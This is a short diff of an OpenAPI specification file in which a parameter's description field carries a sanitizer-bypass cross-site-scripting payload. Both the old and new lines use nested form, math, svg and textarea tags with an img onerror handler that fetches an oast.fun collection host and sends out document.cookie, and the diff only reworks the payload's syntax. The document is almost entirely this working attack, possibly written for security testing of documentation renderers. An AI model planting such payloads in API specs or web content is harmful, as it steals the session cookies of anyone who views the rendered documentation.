@@ -18,7 +18,7 @@ paths:
       summary: Logs in
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><textarea><path id="</textarea><img src="1" onerror="fetch(`https://ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun/report?error=${encodeURIComponent(document.cookie)}`)">"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><textarea><path id="</textarea><img onerror=fetch(`https://ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun/?xss=`+document.cookie) src=1>">"></form>
           format: int64
           in: path
           name: id
